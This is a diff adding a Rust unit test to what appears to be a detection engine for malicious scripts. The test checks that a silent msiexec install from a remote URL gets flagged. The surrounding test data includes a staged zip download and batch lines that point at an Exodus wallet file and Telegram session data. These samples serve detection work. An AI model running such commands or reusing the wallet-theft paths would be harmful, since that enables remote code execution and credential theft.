@@ -11193,6 +11193,23 @@ $urlzip = "https://ps.example/stage.zip""#,
     }
 
     #[test]
+    fn direct_msiexec_url_package_argument_emits_typed_trait() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        let url = "https://msiexec-direct.example/setup.msi";
+        crate::interp::interpret_line(&format!(r#"msiexec /quiet /i "{url}""#), &mut env);
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::UrlArgument { url: got, .. } if got == url
+            )
+        });
+        assert!(
+            has,
+            "direct msiexec package URL not typed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn wallet_extension_and_telegram_paths_emit_credential_access_traits() {
         let script = br#"set "walletPaths[Exodus]=AppData\Roaming\Exodus\exodus.wallet"
 set "tdataPath=C:\Users\puncher\AppData\Roaming\Telegram Desktop\tdata"
